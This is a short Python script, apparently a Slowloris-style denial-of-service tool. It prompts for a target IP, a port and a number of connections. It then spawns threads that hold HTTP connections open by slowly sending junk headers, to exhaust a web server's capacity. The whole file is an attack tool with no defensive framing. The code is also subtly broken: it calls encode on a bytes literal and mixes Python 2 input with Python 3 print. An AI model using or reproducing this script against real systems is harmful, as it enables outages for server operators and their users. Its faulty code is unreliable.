
import socket

import time

import threading

import sys

def attack(host, port):

    s = socket.socket()

    s.settimeout(50)

    s.connect((host,port))

    s.send(b"GET / HTTP/1.1\r\n".encode("utf-8"))

    i = 0

    while True:

        try:

            s.send(b"X-a:2\r\n")

            time.sleep(3)

        except:

            pass


if __name__ == "__main__":

    victim = raw_input("Enter the IP address of target- ")

    port = int(raw_input("Enter the port of target- "))

    connections = int(raw_input("Enter the no of connection you want- "))

    print("")

    for i in range(0,connections):

        a = threading.Thread(target=attack, args=(victim, port))

        a.start()

